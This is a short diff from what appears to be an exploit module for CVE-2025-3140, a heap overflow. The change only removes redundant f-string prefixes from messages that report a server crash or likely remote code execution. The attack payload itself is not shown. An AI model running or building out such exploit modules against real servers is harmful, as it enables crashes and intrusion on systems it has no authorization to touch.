@@ -106,10 +106,10 @@ class Exploit(Exploit):
             resp = s.recv(128)
             s.close()
             if not resp:
-                print_success(f"[CVE-2025-3140] Server crashed — heap overflow triggered! (no response)")
+                print_success("[CVE-2025-3140] Server crashed — heap overflow triggered! (no response)")
             else:
                 print_info(f"[CVE-2025-3140] Response: {resp[:32].hex()} — may be patched")
         except ConnectionResetError:
-            print_success(f"[CVE-2025-3140] Connection reset by server — crash/RCE likely triggered!")
+            print_success("[CVE-2025-3140] Connection reset by server — crash/RCE likely triggered!")
         except Exception as e:
             print_error(f"[CVE-2025-3140] {e}")
